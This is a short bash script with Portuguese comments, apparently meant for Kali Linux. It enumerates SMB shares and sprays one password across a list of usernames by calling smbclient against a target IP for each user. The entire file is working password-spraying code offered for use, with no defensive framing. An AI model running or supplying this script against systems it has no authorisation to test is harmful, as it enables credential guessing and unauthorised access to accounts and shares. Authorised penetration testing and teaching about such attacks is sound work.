#!/bin/bash
# smb_enum_and_spray.sh - exemplo simples (rodar no Kali)
TARGET="$1"
USERS="../wordlists/custom-users.txt"
PW="$2"
if [ -z "$TARGET" ] || [ -z "$PW" ]; then
  echo "Uso: ./smb_enum_and_spray.sh <TARGET_IP> <PASSWORD>"
  exit 1
fi
while read -r u; do
  echo "Tentando $u:$PW"
  smbclient -L \\\\${TARGET} -U ${u}%${PW} -W WORKGROUP -m SMB2 || true
done < ${USERS}
